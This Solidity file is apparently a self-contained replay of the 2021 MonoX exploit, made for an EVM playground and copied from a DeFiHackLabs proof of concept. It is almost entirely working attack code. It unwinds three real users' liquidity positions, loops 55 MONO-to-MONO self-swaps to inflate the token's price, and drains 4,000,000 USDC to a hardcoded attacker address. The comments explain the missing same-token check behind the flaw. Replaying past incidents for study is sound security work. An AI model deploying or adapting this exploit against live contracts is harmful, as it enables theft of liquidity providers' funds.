// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-11-Mono).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry `ContractTest`
// (there is no standalone exploit contract — the test harness `address(this)` IS
// the attacker). This contract is a faithful, self-contained copy of that inline
// attack (testExploit + RemoveLiquidity_From_3_Users + Swap_Mono_for_Mono_55_Times
// + Swap_Mono_For_USDC) so the playground can deploy it and record `run()`.
// Logic, constants, and the 55-iteration self-swap loop are copied verbatim from
// test/Mono_exp.sol. The only change: the final swap sends USDC to the hardcoded
// ATTACKER EOA (the recorder measures profit there) instead of the Foundry
// `msg.sender`.
//
// Root cause: Monoswap.swapExactTokenForToken does NOT forbid `tokenIn == tokenOut`.
// Each MONO→MONO self-swap writes the price DOWN (sell leg) then UP (buy leg) on
// the SAME pool slot, and the up-write lands last, so MONO's stored `price`
// strictly increases every call. Iterating inflates MONO's price ~1e11x, after
// which a dust amount of MONO buys the entire shared MonoXPool USDC vault.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IMonoswap {
    function swapExactTokenForToken(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountOut);

    function swapTokenForExactToken(
        address tokenIn,
        address tokenOut,
        uint256 amountInMax,
        uint256 amountOut,
        address to,
        uint256 deadline
    ) external returns (uint256 amountIn);

    function addLiquidity(address _token, uint256 _amount, address to) external returns (uint256 liquidity);

    function removeLiquidity(
        address _token,
        uint256 liquidity,
        address to,
        uint256 minVcashOut,
        uint256 minTokenOut
    ) external returns (uint256 vcashOut, uint256 tokenOut);

    // (pid, lastPoolValue, token, status, vcashDebt, vcashCredit, tokenBalance, price, createdAt)
    function pools(address) external view returns (uint256, uint256, address, uint8, uint112, uint112, uint112, uint256, uint256);
}

interface IMonoXPool {
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

contract MonoXSelfSwapDrain {
    address constant ATTACKER = 0xEcbE385F78041895c311070F344b55BfAa953258;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant MONO = 0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D;
    address constant MONOSWAP = 0xC36a7887786389405EA8DA0B87602Ae3902B88A1;
    address constant MONOXPOOL = 0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4;

    // Three real LPs whose positions are unwound (no provider check on
    // removeLiquidity — recipient is an arbitrary argument) to thin the MONO pool.
    address constant USER_1 = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;
    address constant USER_2 = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;
    address constant USER_3 = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;

    // PoC's self-imposed cash-out cap: 4,000,000 USDC (6 decimals).
    uint256 constant USDC_OUT = 4_000_000_000_000;
    // Tiny re-seed amount that makes each self-swap a large relative price move.
    uint256 constant SEED_LIQUIDITY = 196_875_656;
    // 0.1 ETH of seed capital (the only upfront cost; the rest is the price ratchet).
    uint256 constant SEED_ETH = 0.1 ether;
    uint256 constant SELF_SWAP_ITERS = 55;

    IWETH constant weth = IWETH(WETH);
    IERC20 constant mono = IERC20(MONO);
    IMonoswap constant monoswap = IMonoswap(MONOSWAP);
    IMonoXPool constant monopool = IMonoXPool(MONOXPOOL);

    // Entrypoint. Receives SEED_ETH as msg.value (funded via setup.fundAttackerWei +
    // attackValueWei), wraps it, buys MONO, thins & re-seeds the pool, self-swaps
    // MONO→MONO to inflate the price, then cashes out 4,000,000 USDC to ATTACKER.
    function run() external payable {
        require(msg.value >= SEED_ETH, "need seed ETH");

        // Approvals (the test approves MONO max, WETH 0.1 ether).
        mono.approve(MONOSWAP, type(uint256).max);

        // Step 0 — buy an initial MONO position with 0.1 ETH of WETH.
        weth.deposit{value: SEED_ETH}();
        weth.approve(MONOSWAP, SEED_ETH);
        monoswap.swapExactTokenForToken(WETH, MONO, SEED_ETH, 1, address(this), block.timestamp);

        // Step 1 — unwind 3 real LPs to collapse the MONO pool's tokenBalance.
        removeLiquidityFrom3Users();

        // Step 2 — re-seed the pool with a tiny, attacker-controlled position.
        monoswap.addLiquidity(MONO, SEED_LIQUIDITY, address(this));

        // Step 3 — self-swap MONO→MONO 55 times; each call ratchets the price up.
        swapMonoForMono55Times();

        // Step 4 — cash out: a dust amount of the now-overpriced MONO buys 4M USDC.
        swapMonoForUSDC();
    }

    function removeLiquidityFrom3Users() internal {
        uint256 bal1 = monopool.balanceOf(USER_1, 10);
        monoswap.removeLiquidity(MONO, bal1, USER_1, 0, 1);

        uint256 bal2 = monopool.balanceOf(USER_2, 10);
        monoswap.removeLiquidity(MONO, bal2, USER_2, 0, 1);

        uint256 bal3 = monopool.balanceOf(USER_3, 10);
        monoswap.removeLiquidity(MONO, bal3, USER_3, 0, 1);
    }

    function swapMonoForMono55Times() internal {
        uint256 poolMonoBalance;
        for (uint256 i = 0; i < SELF_SWAP_ITERS; i++) {
            (,,,,,, poolMonoBalance,,) = monoswap.pools(MONO);
            monoswap.swapExactTokenForToken(MONO, MONO, poolMonoBalance - 1, 0, address(this), block.timestamp);
        }
    }

    function swapMonoForUSDC() internal {
        uint256 monoBalance = mono.balanceOf(address(this));
        // The inflated MONO price means only a dust amount is consumed; the 4M USDC
        // lands directly on ATTACKER, where the recorder scores profit.
        monoswap.swapTokenForExactToken(MONO, USDC, monoBalance, USDC_OUT, ATTACKER, block.timestamp);
    }

    // MonoXPool custodies LP positions as ERC1155 tokens and calls the receiver
    // hook on mint/transfer. The Foundry ContractTest implements this; the
    // synthetic exploit must too, or the addLiquidity/cash-out LP moves revert.
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return 0xf23a6e61; // IERC1155Receiver.onERC1155Received
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return 0xac9c6b35; // IERC1155Receiver.onERC1155BatchReceived
    }

    receive() external payable {}
}
